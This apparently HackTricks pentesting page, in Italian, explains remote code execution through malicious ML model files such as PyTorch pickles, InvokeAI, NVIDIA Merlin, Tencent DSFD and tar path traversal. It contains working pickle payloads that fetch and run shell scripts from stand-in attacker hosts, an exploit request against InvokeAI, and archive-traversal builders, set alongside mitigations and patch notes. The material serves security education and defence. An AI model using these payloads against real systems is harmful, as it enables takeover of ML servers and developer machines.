# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Caricamento dei modelli per RCE

I modelli di Machine Learning sono solitamente condivisi in diversi formati, come ONNX, TensorFlow, PyTorch, ecc. Questi modelli possono essere caricati nelle macchine degli sviluppatori o nei sistemi di produzione per essere utilizzati. Di norma i modelli non dovrebbero contenere codice malevolo, ma ci sono alcuni casi in cui il modello può essere utilizzato per eseguire codice arbitrario sul sistema come funzionalità voluta o a causa di una vulnerabilità nella libreria di caricamento del modello.

Al momento della stesura, questi sono alcuni esempi di questo tipo di vulnerabilità:

| **Framework / Strumento**        | **Vulnerabilità (CVE se disponibile)**                                                    | **Vettore RCE**                                                                                                                           | **Riferimenti**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Deserializzazione insicura in* `torch.load` **(CVE-2025-32434)**                                                              | Un pickle malevolo nel checkpoint del modello porta all'esecuzione di codice (bypassando la protezione `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + download di modelli malevoli causa esecuzione di codice; deserializzazione Java con RCE nell'API di gestione                                        | |
| **NVIDIA Merlin Transformers4Rec** | Deserializzazione insicura del checkpoint tramite `torch.load` **(CVE-2025-23298)**                                           | Un checkpoint non affidabile attiva il pickle reducer durante `load_model_trainer_states_from_checkpoint` → esecuzione di codice nel worker ML            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (YAML insicuro) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Caricamento del modello da YAML usa `yaml.unsafe_load` (esecuzione di codice) <br> Caricamento di un modello con layer **Lambda** esegue codice Python arbitrario          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Un modello `.tflite` appositamente creato innesca un overflow intero → corruzione dell'heap (potenziale RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Il caricamento di un modello tramite `joblib.load` esegue pickle con il payload `__reduce__` dell'attaccante                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` di default permette array di oggetti pickled – `.npy/.npz` malevoli innescano esecuzione di codice                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Il percorso external-weights del modello ONNX può uscire dalla directory (leggere file arbitrari) <br> Un tar di modello ONNX malevolo può sovrascrivere file arbitrari (portando a RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Un modello con custom operator richiede il caricamento di codice nativo dell'attaccante; grafi modello complessi abusano della logica per eseguire computazioni non intenzionate   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | L'uso dell'API di model-load con `--model-control` abilitato permette traversal su percorsi relativi per scrivere file (es., sovrascrivere `.bashrc` per ottenere RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Un file modello GGUF malformato causa heap buffer overflows nel parser, permettendo esecuzione arbitraria di codice sul sistema vittima                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Un modello HDF5 (`.h5`) malevolo con codice in layer Lambda viene ancora eseguito al caricamento (Keras safe_mode non copre il vecchio formato – “downgrade attack”) | |
| **Others** (general)        | *Difetto di design* – Serializzazione con pickle                                                                                         | Molti strumenti ML (es., formati modello basati su pickle, Python `pickle.load`) eseguiranno codice arbitrario incorporato nei file modello a meno che non siano mitigate | |

Inoltre, ci sono alcuni modelli Python basati su pickle come quelli usati da [PyTorch](https://github.com/pytorch/pytorch/security) che possono essere usati per eseguire codice arbitrario sul sistema se non vengono caricati con `weights_only=True`. Quindi, qualsiasi modello basato su pickle potrebbe essere particolarmente suscettibile a questo tipo di attacchi, anche se non è elencato nella tabella sopra.

### 🆕  InvokeAI RCE tramite `torch.load` (CVE-2024-12029)

`InvokeAI` è una popolare interfaccia web open-source per Stable-Diffusion. Le versioni **5.3.1 – 5.4.2** espongono l'endpoint REST `/api/v2/models/install` che permette agli utenti di scaricare e caricare modelli da URL arbitrari.

Internamente l'endpoint invoca infine:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Quando il file fornito è un **PyTorch checkpoint (`*.ckpt`)**, `torch.load` esegue una **pickle deserialization**. Poiché il contenuto proviene direttamente dall'URL controllato dall'utente, un attacker può inserire un oggetto malevolo con un metodo personalizzato `__reduce__` all'interno del checkpoint; il metodo viene eseguito **during deserialization**, portando a **remote code execution (RCE)** sul server InvokeAI.

La vulnerabilità è stata assegnata **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Procedura di sfruttamento

1. Crea un checkpoint malevolo:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Ospita `payload.ckpt` su un server HTTP che controlli (es. `http://ATTACKER/payload.ckpt`).
3. Attiva l'endpoint vulnerabile (non è richiesta autenticazione):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Quando InvokeAI scarica il file chiama `torch.load()` → il gadget `os.system` viene eseguito e l'attaccante ottiene esecuzione di codice nel contesto del processo InvokeAI.

Exploit pronto all'uso: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` automatizza l'intero flusso.

#### Condizioni

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)  
•  `/api/v2/models/install` raggiungibile dall'attaccante  
•  Il processo ha i permessi per eseguire shell commands

#### Mitigazioni

* Aggiornare a **InvokeAI ≥ 5.4.3** – la patch imposta `scan=True` di default ed esegue la scansione malware prima della deserializzazione.  
* Quando si caricano checkpoint programmaticamente usare `torch.load(file, weights_only=True)` o il nuovo helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).  
* Applicare allow-lists / signatures per le sorgenti dei modelli ed eseguire il servizio con il minimo privilegio.

> ⚠️ Ricorda che **qualsiasi** formato basato su Python pickle (inclusi molti file `.pt`, `.pkl`, `.ckpt`, `.pth`) è intrinsecamente non sicuro da deserializzare da fonti non affidabili.

---

Esempio di mitigazione ad-hoc se devi mantenere versioni più vecchie di InvokeAI dietro un reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE tramite `torch.load` non sicuro (CVE-2025-23298)

Transformers4Rec di NVIDIA (parte di Merlin) esponeva un loader di checkpoint non sicuro che chiamava direttamente `torch.load()` su percorsi forniti dall'utente. Poiché `torch.load` si basa su Python `pickle`, un checkpoint controllato dall'attaccante può eseguire codice arbitrario tramite un reducer durante la deserializzazione.

Percorso vulnerabile (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Perché questo porta a RCE: In Python `pickle`, un oggetto può definire un reducer (`__reduce__`/`__setstate__`) che ritorna una callable e argomenti. La callable viene eseguita durante l'unpickling. Se un tale oggetto è presente in un checkpoint, viene eseguito prima che vengano usati i pesi.

Esempio minimo di checkpoint malevolo:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Vettori di consegna e raggio d'azione:
- Trojanized checkpoints/models shared via repos, buckets, or artifact registries
- Pipeline automatizzate di resume/deploy che caricano automaticamente i checkpoint
- L'esecuzione avviene all'interno di training/inference workers, spesso con privilegi elevati (per es., root nei container)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ha sostituito la chiamata diretta a `torch.load()` con un deserializzatore restrittivo, allow-listed, implementato in `transformers4rec/utils/serialization.py`. Il nuovo loader valida tipi/campi e impedisce che callable arbitrari vengano invocati durante il load.

Linee guida difensive specifiche per i checkpoint PyTorch:
- Non eseguire unpickle di dati non attendibili. Preferisci formati non eseguibili come [Safetensors](https://huggingface.co/docs/safetensors/index) o ONNX quando possibile.
- Se devi usare la serializzazione PyTorch, assicurati `weights_only=True` (supportato nelle versioni più recenti di PyTorch) oppure usa un unpickler personalizzato allow-listed simile alla patch di Transformers4Rec.
- Imporre provenienza/firme dei modelli e deserializzazione in sandbox (seccomp/AppArmor; utente non-root; FS ristretto e nessuna uscita di rete).
- Monitorare processi figli inattesi dai servizi ML al momento del caricamento del checkpoint; tracciare l'uso di `torch.load()`/`pickle`.

POC e riferimenti a vulnerabili/patch:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Esempio – creare un modello PyTorch maligno

- Crea il modello:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Carica il modello:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’s FaceDetection-DSFD espone un endpoint `resnet` che deserializza dati controllati dall'utente. ZDI ha confermato che un attaccante remoto può costringere una vittima a caricare una pagina/file malevola, far sì che invii un blob serializzato appositamente creato a quell'endpoint e attivare la deserializzazione come `root`, portando alla compromissione completa.

Il flusso dell'exploit rispecchia l'abuso tipico di pickle:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Qualsiasi gadget raggiungibile durante la deserializzazione (costruttori, `__setstate__`, callback del framework, ecc.) può essere strumentalizzato allo stesso modo, indipendentemente dal fatto che il trasporto sia stato HTTP, WebSocket o un file lasciato in una directory monitorata.


## Modelli per Path Traversal

As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), most models formats used by different AI frameworks are based on archives, usually `.zip`. Therefore, it might be possible to abuse these formats to perform path traversal attacks, allowing to read arbitrary files from the system where the model is loaded.

For example, with the following code you can create a model that will create a file in the `/tmp` directory when loaded:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Oppure, con il codice seguente puoi creare un modello che creerà un symlink alla directory `/tmp` quando verrà caricato:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Approfondimento: Keras .keras deserialization and gadget hunting

Per una guida focalizzata sugli internals di .keras, su Lambda-layer RCE, sul problema degli arbitrary import in ≤ 3.8 e sulla scoperta di gadget post-fix all'interno dell'allowlist, vedere:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Riferimenti

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
